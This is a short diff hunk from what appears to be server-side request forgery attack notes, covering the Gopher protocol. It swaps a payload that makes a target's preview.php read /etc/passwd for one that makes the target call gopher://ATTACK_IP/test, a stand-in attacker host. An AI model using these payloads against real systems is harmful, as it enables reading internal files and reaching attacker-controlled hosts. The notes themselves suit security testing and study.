@@ -14,7 +14,7 @@ Access internal files with "file" protocol
 
 Gopher protocol
 
-    http://TARGET_IP/preview.php?url=gopher:///etc/passwd
+    http://TARGET_IP/preview.php?url=gopher://ATTACK_IP/test
 
 Access internal applications (Results from the internal port scanning)
 
